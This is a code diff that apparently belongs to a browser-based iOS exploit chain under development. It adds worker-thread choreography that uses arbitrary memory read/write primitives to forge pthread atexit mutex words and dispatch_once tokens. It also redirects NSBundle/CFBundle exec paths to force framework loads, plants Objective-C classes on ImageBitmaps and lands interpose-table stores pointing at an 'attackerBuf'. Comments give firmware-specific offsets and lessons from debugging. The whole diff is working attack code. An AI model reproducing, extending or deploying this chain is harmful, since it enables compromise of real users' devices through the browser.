@@ -24,6 +24,12 @@ function hex(value) {
 function noPAC(value) {
     return value & 0x7fffffffffn;
 }
+const W1_WAKE_PATH = '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT';               // worker1 wake: needs a vehicle whose initializers have static C++ destructors (what __cxa_atexit actually REGISTERS at runtime). Low-init frameworks DISPROVEN (2026-07-23): Proximity (1-2 inits) loaded 1100->1101 but GEN TIMEOUT every attempt -- ObjC/C-only inits, no runtime cxa registration, no drop. TextInput bundles are resource-only (no executable). XOJIT: ~71 real cxa registrations (produces drops), NOT resident at fire time, NOT in TT's closure. (MacinTalk disproven: RESIDENT via worker1's own TT load.) MUST NOT be XGBoost -- stage6's gate-free slow_dlopen needs that FRESH (a resident target -> no new inits -> no drop -> worker2 never wakes)
+const W2_WAKE_PATH = '/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI';               // worker2 wake: DarkSword's PROVEN wake framework (git 4e2aad1 WAKE_PATHS) -- DISTINCT family from XGBoost, never resident -> loads fresh and its C++ initializers' __cxa_atexit produce the drop. MacinTalk REPLACED (2026-08-02): 3 inits loaded fresh (1107->1109) but produced NO cxa registration -> GEN TIMEOUT every run (the documented low-init failure: ObjC/C-only inits, no runtime cxa registration, no drop)
+async function fireWorkerWake(path, tok, opts) {
+    postMessage(`[mapredir] worker wake: ${path}`);
+    return await wakeViaMapRedirect(path, tok, opts);
+}
 
 BigUint64Array.prototype.data = function () { return p.read64(p.addrof(this) + 0x10n); };
 
@@ -198,26 +204,68 @@ class Encoder {
     }
 };
 const canvas = new OffscreenCanvas(64, 64);
-// --- atexit mutex state management (26.1 layout: bit1=held, bit0=kernel-ulock-allocated flag,
-// low-half bits 8-31 = waiter count in 0x100 units, high-half bits 32+ = wake generation).
-// A release broadcasts ONLY when low waiter count > high wake generation; after a real wake the
-// word rests at 0x0000010000000100 (count == gen) and NO further wake fires until we re-arm by
-// zeroing the gen. DarkSword's bare values do exactly that: 0x102 arms a park (held + waiter,
-// gen 0), 0x101 fires a wake (held clear, kernel flag + waiter, gen 0 -> count > gen). NEVER
-// write 0x03 (no waiter -> no wake) or 0x00 (count == gen -> no wake), and never RMW-preserve
-// the wake generation (that leaves count == gen -> the next park's release never fires, which is
-// what stalled worker2's wake at 13M spins).
+// --- atexit mutex state management (26.1 protocol, disasm-verified on 23B85 libsystem_c +
+// libsystem_pthread): pthread_mutex_t at 0x1ed3f0b60 (NORMAL flavor; bits 2-3 of +0xc == 0).
+// The 64-bit ulock word is at +0x20 (align8(x0+0x27) in the fast lock, fast unlock AND slow
+// entry; owner slot at +0x18). Word layout: bit0 (0x01) = kernel-ulock-allocated flag,
+// bit1 (0x02) = HELD, low-half bits 8-31 = waiter count (+0x100 per registered waiter),
+// high-half bits 8-31 = wake generation (+0x100 per drop).
+// pthread_mutex_unlock fast path (0x1df14da44): if (low & 0xffffff00) == (high & 0xffffff00)
+// it just clears HELD -- NO kernel call. unlock_slow (0x1df14dfc4) fires only when count > gen:
+// clears HELD, bumps gen by 0x100<<32, then __psynch_mutexdrop wakes every thread sleeping on
+// the word. 26.1 ASSERT (NEW vs 18.6): a drop returning -1 with errno outside {0, EINTR} --
+// ENOENT when NO thread is sleeping on the word -- kills the UNLOCKER at brk #0xb001
+// "BUG IN LIBPTHREAD: __psynch_mutexdrop failed" (0x1df14ed48, msg @ 0x1df158cce). DarkSword's
+// bare 0x101 (count=1, gen=0) invites exactly that drop on the next unlock by ANY thread; on
+// 18.6 the ENOENT was silent. So on 26.1: count>gen ONLY while a sleeper really exists;
+// otherwise keep count == gen and no drop is ever issued. A plain value write NEVER wakes a
+// sleeper (no kernel notification) -- only a real unlock's drop does.
+// SEED-AND-VERIFY (2026-07-22): the onceToken seed is a small value written by write64's split
+// path, which SILENTLY FAILS under the fire's concurrent load (§5s: "the seed silently not
+// landing is how this recurs"). Write, re-link, read back, retry up to 4x; log the final read
+// so the run log PROVES the seed landed (or names the miss instead of brking on a wrong token).
+function seedTokenVerify(value, tag) {
+    const A = offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken;
+    let got = 0n;
+    for (let i = 0; i < 4; i++) {
+        p.reestablishRead64();
+        p.write64(A, value);
+        p.reestablishRead64();
+        got = p.read64(A);
+        if (got === value) { postMessage(`[seed] ${tag}: token=${hex(got)} OK (try ${i + 1})`); return true; }
+    }
+    postMessage(`[seed] ${tag}: MISS after 4 tries (token=${hex(got)} want ${hex(value)})`);
+    return false;
+}
+// SPIN THROTTLE (2026-07-22, the vphone restarts): the tight read64 polls (millions of spins/sec
+// across the chain + poller + workers) pin the vphone's CPU and trip its device-level watchdog ->
+// reboot. Sleep ~1ms every 2048 spins in every hot loop (~30-60% duty) -- the waited-for events
+// are ~10-50ms timescale, so this costs almost nothing in latency but drops the device load to
+// survivable. Used by every poll below (outer wake poll, CAS/gen/store/completion spins, stage6).
+async function spinYield(g) { if ((g & 0x7ff) === 0) await new Promise(r => setTimeout(r, 1)); }
+// COOL variant for the long one-way waits (store-sync / wake polls / registration wait):
+// ~2.3ms work burst + 4ms sleep ~= 36% duty (vs ~90% for spinYield). The 10M+-spin wake
+// polls at 90% duty are what trips the vphone's CPU watchdog into a reboot (load 29-30
+// observed 2026-07-22). The timing-critical gate spins (CAS/gen/HELD/completion) keep spinYield.
+async function spinYieldCool(g) { if ((g & 0x1ff) === 0) await new Promise(r => setTimeout(r, 4)); }
 const Atexit_mutexStateAddr = () => offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
-// PARK: held + a registered waiter, gen zeroed (worker blocks; the next release with count>gen wakes it).
+// PARK: held + a registered waiter, gen zeroed (worker blocks; a later drop with count>gen wakes it).
 function atexitHold() { p.write64(Atexit_mutexStateAddr(), 0x102n); }
-// WAKE/PASS: held clear so the next __cxa_atexit acquires; kernel flag + waiter kept; gen zeroed
-// so count(0x100) > gen(0) and its release broadcasts to the parked worker.
-function atexitPass() { p.write64(Atexit_mutexStateAddr(), 0x101n); }
+// PASS (benign): held clear, count == gen (0x100 each) -> every future unlock takes the fast
+// path: no drop, no brk, and no sleeper is woken. Unconditionally safe on 26.1.
+function atexitPass() { p.write64(Atexit_mutexStateAddr(), 0x0000010000000101n); }
+// WAKE: 0x101 leaves count(0x100) > gen(0), so the NEXT real __cxa_atexit unlock drops and
+// wakes every sleeper on the word (a value write alone never does). Call ONLY when a worker is
+// protocol-known to be parked (p.workerParked -- set at the page triggers, cleared at each
+// poll's success): the word's own count field is NOT a reliable sleeper indicator (silent/hold
+// re-writes clobber the registration while the worker keeps sleeping in the kernel). With a
+// real sleeper the drop returns 0; with none, 26.1 brks the unlocker (brk #0xb001).
+function atexitWake() { p.write64(Atexit_mutexStateAddr(), 0x101n); }
 // SILENT: proceed with NO broadcast: held + waiter clear, kernel flag kept, count == gen -> a
 // release takes the no-waiters path and the parked worker stays parked.
 function atexitSilent() { p.write64(Atexit_mutexStateAddr(), 0x01n); }
-// legacy name used across the chain: arm the pass state before a load.
-function armAtexitPass() { atexitPass(); }
+// legacy name used across the chain: arm the wake state before a load (a worker is parked).
+function armAtexitPass() { atexitWake(); }
 
 // Scan a parked worker's stack for candidate RETURN ADDRESSES (shared-cache code range) so we can
 // symbolize the exact function its dlopen is stuck in offline (ipsw a2s). This answers the one
@@ -236,8 +284,6 @@ function dumpWorkerStack(worker, tag) {
 }
 
 async function loadObjcClass(cls) {
-        if (!p.silentLoad) armAtexitPass();
-
     const cx = canvas.getContext('2d', { willReadFrequently: true });
     cx.fillStyle = '#f00';
     cx.fillRect(0, 0, 64, 64);
@@ -288,17 +334,11 @@ async function waitGateQuiesce(tag) {
 // NSBundle, no TT._lock -- and the fresh image's ___cxa_atexit release broadcasts on the atexit
 // mutex. With the waiter bit armed, that is the wake. Worker-safe subset only (no window APIs).
 function pumpSoftlink() {
-    try { new VideoDecoder({ output() { }, error() { } }).configure({ codec: 'avc1.42001f', optimizeForLatency: true }); } catch (e) { }
-    try { new VideoDecoder({ output() { }, error() { } }).configure({ codec: 'hev1.1.6.L120.90', optimizeForLatency: true }); } catch (e) { }
-    try { new VideoEncoder({ output() { }, error() { } }).configure({ codec: 'avc1.42001f', width: 64, height: 64, bitrate: 100000, framerate: 10 }); } catch (e) { }
-    try { new AudioDecoder({ output() { }, error() { } }).configure({ codec: 'mp4a.40.2' }); } catch (e) { }
-    try { new AudioDecoder({ output() { }, error() { } }).configure({ codec: 'opus' }); } catch (e) { }
-    try { new AudioEncoder({ output() { }, error() { } }).configure({ codec: 'mp4a.40.2', sampleRate: 8000, numberOfChannels: 1, bitrate: 8000 }); } catch (e) { }
-    try { new BarcodeDetector({ formats: ['qr_code'] }); } catch (e) { }          // Vision.framework
-    try { BarcodeDetector.getSupportedFormats(); } catch (e) { }
-    try { new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/heic' }); } catch (e) { }   // ImageIO encoder plugins
-    try { new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/avif' }); } catch (e) { }
-    try { const cx = new OffscreenCanvas(32, 32).getContext('2d'); cx.filter = 'blur(2px)'; cx.fillStyle = '#f00'; cx.fillRect(0, 0, 32, 32); } catch (e) { }   // CoreImage.framework (canvas 2d filter, http-safe, worker-safe)
+    // DISABLED (2026-07-22): codec/Vision instantiation is pure framework-load overhead (and mostly
+    // no-ops over plain http on a LAN origin, per run 260719_014753's note) -- it spikes images right
+    // after baseline, correlating with the clean tab reloads there (footprint stays ~7MB, so these
+    // are NOT memory-pressure; they're teardown/unresponsiveness at the load event).
+    return;
 }
 
 // --- instrumented probe battery (run 260719_014753: pump v3 + WAKE_CLASS produced ZERO
@@ -359,6 +399,9 @@ function pumpRefireWinners() {
 function initWakeTargets() {
     if (p.wakeTargets) return;
     p.wakeTargets = [
+        { name: 'SoundAnalysis via _MLSNFrameworkHandle', cls: offsets.CoreML__OBJC_CLASS___MLSNFrameworkHandle },
+        { name: 'Vision via _MLVNFrameworkHandle', cls: offsets.CoreML__OBJC_CLASS___MLVNFrameworkHandle },
+        { name: 'NaturalLanguage via _MLNLPFrameworkHandle', cls: offsets.CoreML__OBJC_CLASS___MLNLPFrameworkHandle },
         { name: 'CoreData via UIManagedDocument', cls: offsets.UIKitCore__OBJC_CLASS__UIManagedDocument },
         { name: 'ManagedConfiguration via LSApplicationRestrictionsManager', cls: offsets.CoreServices__OBJC_CLASS__LSApplicationRestrictionsManager },
         {
@@ -403,12 +446,12 @@ async function fireWakeTarget(t, lockAddr, tok) {
             t.prereqDone = true;
         }
         const l0 = dyldLoadedCount();
-        atexitPass();
+        atexitWake();   // a worker is parked: arm the wake so the fire's real unlocks drop to it (guarded)
         try { await loadObjcClass(t.cls); } catch (e) { postMessage(`[wake] ${t.name} ERR ${e && (e.message || e)}`); }
         const l1 = dyldLoadedCount();
         t.spent = (l1 !== l0);
         postMessage(`[wake] fired ${t.name}: loaded ${l0}->${l1}${t.spent ? ' SPENT' : ' (no fresh load -- will try next target)'}`);
-        atexitPass();   // keep the waiter registered for the next broadcast
+        atexitPass();   // benign pass (count==gen): no drop armed here; the wake sites re-arm as needed
     } finally {
         p.noAtexitPark = false;
     }
@@ -449,11 +492,17 @@ function tableMapInfo() {
     };
 }
 function setupMapRedirect() {
+    // NOTE (2026-08-02): a "fresh borrow" rotation was tried for worker2's wake but the rotated
+    // candidate (idx4, embedded CFBundle) crashed the spare's gate -> reverted to REUSING the known
+    // good first candidate (idx0, a real loaded framework). The borrow is restored after every fire.
     if (p.mapRedir) return p.mapRedir;
     const { count, values } = tableMapInfo();
     let ttSlot = 0n, ttOrig = 0n, borrow = 0n, borrowIdx = -1n;
     for (let i = 0n; i < count; ++i) {
         const v = p.read64(values + i * 8n);
+        let bpath = '?';
+        if (v > 0x100000000n) try { const ip = p.read64(v + structs.NSBundle_initialPath); if (ip > 0x180000000n && ip < 0x210000000n) { const dp = p.read64(ip + structs.CFString_dataPtr); if (dp > 0x180000000n && dp < 0x210000000n) bpath = readCString(dp, 80); } } catch (e) { }
+        postMessage(`[mapredir] bundle[${i}]=${hex(v)} path="${bpath}"`);
         if (v === p.TextToSpeech_NSBundle) { ttSlot = values + i * 8n; ttOrig = v; }
         else if (!borrow && v > 0x100000000n && p.read64(v + structs.NSBundle_cfBundle) !== 0n) { borrow = v; borrowIdx = i; }
     }
@@ -494,17 +543,57 @@ function fireAutopsy(mr, l0) {
         const cfLoaded = p.read64(cfNow + structs.CFBundle_loadedFlag) & 0xffn;
         const cfExec = p.read64(cfNow + structs.CFBundle_execPath);
         const flags = p.read64(mr.borrow + structs.NSBundle_flags);
+        // TRACE PROBE (2026-07-23): read the forged exec-path CFString's CONTENT (what the spare's
+        // block actually dlopens). If the string rewrite didn't land it still says TextToSpeech and
+        // the spare's dlopen is a resident no-op (no initializers -> no registrations -> GEN TIMEOUT).
+        let forgedPath = '?';
+        try {
+            const sdp = p.read64(offsets.CFNetwork__gConstantCFStringValueTable + structs.CFString_dataPtr);
+            if (sdp > 0x100000000n) forgedPath = readCString(sdp, 96);
+        } catch (e) { }
         let bpath = '?';
         try {
             const ip = p.read64(mr.borrow + structs.NSBundle_initialPath);
-            if (ip > 0x100000000n) bpath = readCString(p.read64(ip + structs.CFString_dataPtr), 96);
+            if (ip > 0x180000000n && ip < 0x210000000n) { const dp = p.read64(ip + structs.CFString_dataPtr); if (dp > 0x180000000n && dp < 0x210000000n) bpath = readCString(dp, 96); }
         } catch (e) { }
-        postMessage(`[mapredir] autopsy: onceToken=${hex(tok)} (want -1=block ran) borrow.path="${bpath}" cf.loaded=${cfLoaded} cf.exec=${hex(cfExec)} flags=${hex(flags)} loadedNow=${dyldLoadedCount()} (was ${l0})`);
+        postMessage(`[mapredir] autopsy: onceToken=${hex(tok)} (want -1=block ran) borrow.path="${bpath}" forgedPath="${forgedPath}" cf.loaded=${cfLoaded} cf.exec=${hex(cfExec)} flags=${hex(flags)} loadedNow=${dyldLoadedCount()} (was ${l0})`);
     } catch (e) { postMessage(`[mapredir] autopsy ERR ${e && (e.message || e)}`); }
 }
-async function wakeViaMapRedirect(path, tok) {
+// Plant an ObjC class on a worker's ImageBitmap via R/W (same wrapped->imageBuffer->objcClass path
+// as loadObjcClass, but targeting a specific worker's globalThis[1] bitmap address).
+function plantOnBitmap(bitmap, cls) {
+    const wrappedBitmap = p.read64(bitmap + structs.JSImageBitmap_wrapped);
+    const imageBuffer = p.read64(wrappedBitmap + structs.ImageBitmap_buffer);
+    p.write64(imageBuffer + structs.ImageBuffer_objcClass, cls);
+}
+async function wakeViaMapRedirect(path, tok, opts) {
+    opts = opts || {};
+    // EARLY-OUT (2026-07-22, lldb-proven: two simultaneous wrong-owner brks, frozen in-flagrante):
+    // if worker1's store ALREADY landed, worker1 is AWAKE and its completion is PENDING (epilogue
+    // -> NSBundle unlock -> session XPC -> dispatch_once completion). The re-zero+spare-CAS below
+    // walks the token through 0 -> spareTok, and worker1's completion (which only ever finds
+    // w1tok legal) brks on it -- AND the spare's own fast completion brks on the w1tok seed.
+    // lldb: BOTH threads frozen at libdispatch+0x36874 in the same instant. worker1's arc finishes
+    // BY ITSELF (store -> unlock -> completion on w1tok -> token -1, all legal) -- so when the
+    // store is already in, fire NOTHING and touch NOTHING; the poll's lock!=w1tok clears on its own.
+    // EXTENSION: worker1 may be awake WITHOUT its store in yet (ambient-woken during stage4->5,
+    // before the silent write). A drop bumps the atexit wake-generation (high half) the FIRST time
+    // any unlock fires with count>gen, and it never clears -- so gen != 0 is proof worker1 MAY be
+    // awake with a completion pending, and the re-zero below would brk it. Skip the fire there too:
+    // worker1's own arc still produces the store (and its completion stays legal on w1tok).
+    const __A = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
+    // EARLY-OUT is worker1-wake-specific: it protects worker1's in-flight completion from the
+    // re-zero below. In stage6 worker1 is already done and the leftover store/gen are stale, so
+    // opts.skipEarlyOut (set by the stage6 fire) lets the fire through.
+    if (!opts.skipEarlyOut && (p.read64(p.p_InterposeTupleAll_buffer) === p.attackerBuf || (p.read64(__A) >> 32n) !== 0n)) {
+        postMessage(`[mapredir] EARLY-OUT: store=${p.read64(p.p_InterposeTupleAll_buffer) === p.attackerBuf} gen=${hex(p.read64(__A) >> 32n)} -- NO fire (worker1 awake; token untouched, completion legal on w1tok)`);
+        return true;
+    }
     const mr = setupMapRedirect();
     if (!mr) return false;
+    // CRASH-PIN (2026-08-02, stage6 spare4 death): log the borrow's pre-forge state + the onceToken
+    // so a fast spare-gate completion crash leaves the borrowed-bundle validity + token behind.
+    slog(`[mapredir] FIRE ${path}: borrow=${hex(mr.borrow)} cf=${hex(mr.borrowCF)} cf.loaded=${(p.read64(mr.borrowCF + structs.CFBundle_loadedFlag) & 0xffn)} cf.exec=${hex(mr.savedExec)} tok=${hex(p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken))}`);
     const cs = p.makeCString(path);
     // forge the exec path into the shared value-table CFString (a REAL object -- no autda issue),
     // same recipe as rearmCFBundleLoader. NOTE: the real TT CFBundle's execPath also points here,
@@ -518,18 +607,147 @@ async function wakeViaMapRedirect(path, tok) {
     const l0 = dyldLoadedCount();
     p.write64(mr.slot, mr.borrow);                                  // TTS path -> borrowed REAL bundle
     p.noAtexitPark = true;
-    atexitPass();                                                   // wake state: held clear, waiter kept (was bare 0x100)
-    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);  // loader +initialize stub early-rets on -1
+    atexitSilent();   // drop-proof through the re-zero + CAS + seed: worker1 CANNOT wake (cannot complete)
+    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, 0n);  // fresh CAS for the spare (loader stub early-rets on -1)
     const wakeCls = nextAVSpeechClass();                            // FRESH class -- +initialize fires once per class ever
-    postMessage(`[mapredir] firing plant ${hex(wakeCls)}`);
-    try { await loadObjcClass(wakeCls); }
-    catch (e) { postMessage(`[mapredir] wake ERR ${e && (e.message || e)}`); }
-    // dispatch_once gate SEED (crash 091458 fix): on 26.1 the in-progress onceToken is the
-    // running thread's mach port (tsd+0x18 & ~3), and the completing block asserts OLD==own port
-    // ("lock not owned by current thread"). The parked worker is INSIDE this dispatch_once block
-    // and will release it on completion -- seed the token with ITS port so that release is legal.
-    // (Our own fire just released the gate cleanly, OLD==chain port.) The next fire re-zeros.
-    p.write64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken, BigInt(tok) & ~3n);
+    const spare = (p.spare_workers && p.spare_workers[opts.spareIdx || 0]) || p.sub_worker;
+    if (!spare) { postMessage(`[mapredir] no spare worker (spareIdx ${opts.spareIdx || 0}) -- cannot fire`); return false; }
+    postMessage(`[mapredir] spare-fire: plant ${hex(wakeCls)} on spare bitmap (spareIdx ${opts.spareIdx || 0}), close() on spare's thread`);
+    slog(`[mapredir] FIRE-SPARE spareIdx=${opts.spareIdx || 0} cls=${hex(wakeCls)} tok=${hex(p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken))}`);
+    plantOnBitmap(workerBitmap(spare.ctx), wakeCls);
+    postMessage({ type: 'fire_spare', spareIdx: opts.spareIdx || 0 });   // -> page closes the selected spare's bitmap -> gate CAS + fresh load on spare's thread
+    // V5 CHOREOGRAPHY (2026-07-22): two gate executors remain (worker1's stage4 CAS + this spare
+    // fire) -- the chain's Voice-load gate is gone. The 26.1 completion assert is
+    // (own_port ^ token) >= 4 -> brk, and block completions fire at uncontrollable times (the
+    // block's early-return path skips the session XPC when the load allows). Ordering:
+    //   * mutex SILENT through the re-zero + CAS + seed, so worker1 CANNOT wake (cannot complete);
+    //   * seed w1tok AT THE CAS -- worker1's completion is legal whenever it wakes;
+    //   * arm the drop (0x101) -- the spare's registrations wake worker1;
+    //   * FREEZE the spare (0x102 hold) once its first registration has released (gen flips) and
+    //     worker1's own post-wake acquire has released (HELD clear) -- the spare's block then
+    //     parks at its next __cxa_atexit and can NEVER complete on w1tok;
+    //   * worker1 (past the mutex -- its store proves it) completes on w1tok -> token -1;
+    //   * seed spareTok + release (0x101) -> the spare's late completion is legal too.
+    const spareTok = BigInt(spare.threadPort) & ~3n;
+    const A = offsets.libsystem_c__atexit_mutex + structs.Atexit_mutexState;
+    let g0 = 0;
+    while (p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken) === 0n) {
+        if ((g0 & 0x3fff) === 0) p.reestablishRead64();
+        if (++g0 % 1000000 === 0) postMessage(`[mapredir] CAS-spin ${g0}: token still 0 (spare not in gate yet)`);
+        await spinYield(g0);
+        if (g0 % 2000000 === 0) postMessage({ type: 'fire_spare', spareIdx: opts.spareIdx || 0 });   // delivery retry (idempotent: a re-close on a spent plant is a no-op) -- in-page-reload attempts drop the first post
+        if (g0 > 200000) { postMessage('[mapredir] CAS TIMEOUT (spare never entered the gate) -- seeding w1tok anyway'); break; }   // tight cap: the CAS lands in 1-444 spins when it works (200k = 450x margin); longer spins are the device-clobber hammer (vphone reboot 2026-07-22)
+    }
+    slog(`[mapredir] CAS exited after ${g0} spins tok=${hex(p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken))} (0=timeout, nonzero=spare claimed)`);
+    p.reestablishRead64();   // write64's small-value split path depends on read64 (the fire clobbers it)
+    seedTokenVerify(BigInt(tok) & ~3n, 'ARM w1tok');   // worker1's completion (error-return OR fast) can fire at any time after its wake -> always legal from here. On vphone the spare's block then hangs in the session-XPC and never completes; its error-return (load failure) is covered by the gen-timeout spareTok below; its success-path completion is prevented by the gen-flip freeze.
+    // COUNT-MATCHED ARM (2026-07-23): use worker1's ACTUAL park count (captured at stage4-end in
+    // p.parkWord) instead of the fixed 0x101. The spare's drop then advertises the same count as
+    // worker1's park-wait -> the psynch generation matches (worker1's stale mgen had count=3, the
+    // fixed 0x101 count=1 never matched). HELD cleared (|~0x2) so the spare can still acquire.
+    const __arm = ((p.parkWord !== undefined ? p.parkWord : 0x102n) & ~0x2n) | 0x1n;
+    p.write64(A, __arm);
+    postMessage(`[mapredir] spare CAS after ${g0} spins; drop armed count-matched ${hex(__arm)} (parkWord=${hex(p.parkWord)})`);
+    // GEN-FLIP: the spare's first registration release bumps the wake generation (high half) and
+    // drops to worker1. On timeout: the spare's load produced no registration -- its block may
+    // early-return and complete; seed spareTok to keep ITS completion legal (worker1 is asleep).
+    let frozeSpare = false;
+    let g1 = 0;
+    while ((p.read64(A) >> 32n) === 0n) {
+        if ((g1 & 0x3fff) === 0) p.reestablishRead64();
+        if (++g1 > 50000) break;   // ~18ms. NOT a tuning knob: measured over 5x25 attempts the flip is BIMODAL -- when it happens it lands at median ~400-840 spins (max ~2000), and otherwise it never happens at all. Nothing was ever observed flipping between 2k and 50k, so widening this (tried at 400k) rescues nothing. GEN TIMEOUT is "the drop did not occur", not "we stopped looking too early".
+        await spinYield(g1);
+    }
+    if ((p.read64(A) >> 32n) === 0n) {
+        // the spare's load errored (no registration): its block will early-return and complete
+        // on the CURRENT token -- w1tok from the ARM seed -- which would brk the SPARE. Cover it:
+        // switch to spareTok (worker1 is still asleep, so its completion is not in play yet).
+        seedTokenVerify(spareTok, 'GEN-TIMEOUT spareTok');
+        postMessage(`[mapredir] GEN TIMEOUT (no registration drop) -- seeded spareTok (spare error-return completion legal; worker1 still asleep)`);
+    } else {
+        // The drop fired (gen flip); worker1 was woken and MUST re-acquire the mutex to finish its
+        // __cxa_atexit and reach the epilogue/store. The OLD code froze the mutex (0x102 HELD) the
+        // instant it saw HELD clear -- which is right after the SPARE's own release, BEFORE worker1
+        // re-acquired ("held-clear after 0 spins" in EVERY failing log) -> the freeze hard-blocked
+        // worker1's re-acquire -> worker1 parked forever (lldb: still at __cxa_atexit+40 post-abort).
+        // EXPERIMENT (2026-08-01, FREEZE-AFTER-STORE): the HELD-bit gate above could not tell
+        // worker1's acquire from the SPARE's -- the spare runs ~71 __cxa_atexit registrations for
+        // XOJIT, so HELD flickers constantly and the poll latched the spare ~71:1. Measured over 25
+        // attempts: latching early (HELD-set seen in 4-68 spins) = 0/8 survival, because the 0x102
+        // freeze lands before worker1 re-acquires and blocks the one thread that has to reach the
+        // store. Timing out (~1s) = 10/15. The gate never protected worker1; it only decided how
+        // soon the freeze hit it.
+        // So: do NOT freeze here. Seed w1tok (worker1's completion must be legal from the moment it
+        // wakes -- independent of the freeze) and let the store-sync below run with the mutex FREE.
+        // The freeze moves to immediately after the store lands, where it can no longer block
+        // worker1. Safe on this device: the spare's block does not complete inside the run at all
+        // (`close() RETURNED` never fires; every autopsy shows onceToken still a live port, never
+        // -1) -- per AGENTS.md §5s it hangs in the Bambi session XPC and answers ~13s later, so
+        // parking it a few ms later is well inside that envelope.
+        p.reestablishRead64();
+        seedTokenVerify(BigInt(tok) & ~3n, 'ARM-PRE-STORE w1tok');
+        postMessage(`[mapredir] drop seen (gen flip after ${g1} spins); seeded w1tok&~3, mutex LEFT FREE for worker1's re-acquire (freeze deferred to post-store)`);
+    }
+    // EARLY AUTOPSY (2026-07-22): log the borrowed-bundle load outcome for EVERY fire, right after
+    // the gen-spin -- the error-return completions (vphone brks) and GEN TIMEOUTs (stalls) all
+    // trace to whether this load actually ran. cf.loaded=1 + loadedNow>l0 = the redirect worked.
+    fireAutopsy(mr, l0);
+    // SYNC: spin until the woken worker's interpose store lands, so the TT-slot restore below can't
+    // race the clone load. STAGE-AWARE (2026-08-02): stage5's store is worker1 writing the BUFFER
+    // (RS+0xb8 == attackerBuf); stage6's store is worker2 writing the SIZE (== opts.wantSize). For
+    // stage6 the buffer check is a FALSE POSITIVE (worker1's leftover buffer) -> the freeze below
+    // fired before worker2 re-acquired and blocked it -> the size never landed (raced 3/4 runs).
+    // Defer the freeze to worker2's REAL store.
+    const __storeDone = () => opts.wantSize !== undefined
+        ? p.read64(p.p_InterposeTupleAll_size) === opts.wantSize
+        : p.read64(p.p_InterposeTupleAll_buffer) === p.attackerBuf;
+    let g = 0;
+    while (true) {
+        if ((g & 0x3fff) === 0) p.reestablishRead64();   // the fire's heavy load clobbers read64Str
+        if (__storeDone()) break;
+        if (++g % 100000 === 0) {
+            // WAKE-VS-STORE PROBE (2026-07-23): worker STILL PARKED (cxa needle present = the drop
+            // never woke it) vs PAST it (needle gone = worker woke but the store failed -> forge
+            // problem). Splits the two failure classes that both surface as "store NEVER LANDED".
+            try {
+                const __wk = p.dlopen_workers.find(w => (w.id & 0xffffffffn) === (opts.wantSize !== undefined ? 0x22222222n : 0x11111111n));
+                const __cxa = offsets.libsystem_c__cxa_atexit + 0x28n;
+                const __nu = [Number(__cxa & 0xffn), Number((__cxa >> 8n) & 0xffn), Number((__cxa >> 16n) & 0xffn), Number((__cxa >> 24n) & 0xffn), Number((__cxa >> 32n) & 0xffn)];
+                const __still = p.search_once(__wk.stack_top, __wk.stack_bottom, __nu) !== 0n;
+                postMessage(`[mapredir] store-spin ${g}: buffer=${hex(p.read64(p.p_InterposeTupleAll_buffer))} size=${hex(p.read64(p.p_InterposeTupleAll_size))} worker ${opts.wantSize !== undefined ? '2' : '1'} ${__still ? 'STILL PARKED at __cxa_atexit (drop never woke it)' : 'PAST __cxa_atexit (WOKE, store failed)'}`);
+            } catch (e) { postMessage(`[mapredir] store-spin ${g}: probe ERR ${e && (e.message || e)}`); }
+        }
+        await spinYieldCool(g);
+        if (g > 500000) { postMessage('[mapredir] store TIMEOUT (worker never interposed)'); break; }   // BOUNDED: the store trails the wake by ms when it works; 500k cool spins (~6s) is >100x margin. (The 2026-07-23 manual edit removed this cap -> 21.9M-spin uncapped hammer -> vphone reboot loop.)
+    }
+    postMessage(`[mapredir] spare store landed after ${g} spins (${opts.wantSize !== undefined ? 'size' : 'buffer'})`);
+    // FREEZE (moved here 2026-08-01): worker1 is past the mutex now -- either its store landed, or
+    // the spin gave up and the attempt is lost anyway -- so 0x102 can no longer block it. The
+    // spare's next __cxa_atexit parks it, which is all the freeze was ever for; the tail below
+    // (spareTok seed + 0x101 release) is unchanged and still expects frozeSpare.
+    p.reestablishRead64();
+    p.write64(A, 0x102n);
+    frozeSpare = true;
+    postMessage(`[mapredir] spare FROZEN at 0x102 (post-store)`);
+    // COMPLETION WAIT (SHORT): token -> -1 = worker1 completed (on the w1tok seed from the freeze;
+    // the spare is frozen and cannot complete). On vphone worker1's session-XPC NEVER answers (§5r:
+    // 12s AND 60s both timed out), so a long wait is pure delay AND the frozen spare's held mutex
+    // would stall the caption carrier's registrations. On the real device worker1 completes ~0.13s
+    // after its store -- inside this short window. So: wait briefly for -1, then seed spareTok
+    // UNCONDITIONALLY (the spare's completion is the only one left in play on vphone; on the real
+    // device worker1's already fired on w1tok) and release the spare (0x101) -- the caption
+    // carrier's own registrations then drop to it and its completion lands on spareTok -> legal.
+    let g2 = 0;
+    while (p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken) !== 0xffffffffffffffffn) {
+        if ((g2 & 0x3fff) === 0) p.reestablishRead64();
+        if (++g2 > 60000) break;   // ~1-2s: real-device worker1 completes in ~0.13s; vphone never does
+        await spinYield(g2);
+    }
+    const tokNow = p.read64(offsets.AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken);
+    seedTokenVerify(spareTok, 'RELEASE spareTok');
+    postMessage(`[mapredir] ${tokNow === 0xffffffffffffffffn ? `worker1 completed after ${g2} spins` : `completion not seen in ${g2} spins (token=${hex(tokNow)}; vphone-hang or already-done)`}; seeded spareTok&~3`);
+    if (frozeSpare) p.write64(A, 0x101n);   // RELEASE: the next real unlock drops -> the spare resumes -> completes on spareTok
+    if (frozeSpare) postMessage('[mapredir] spare released (0x101)');
     fireAutopsy(mr, l0);
     p.noAtexitPark = false;
     p.write64(mr.slot, mr.orig);                                    // restore real TT bundle
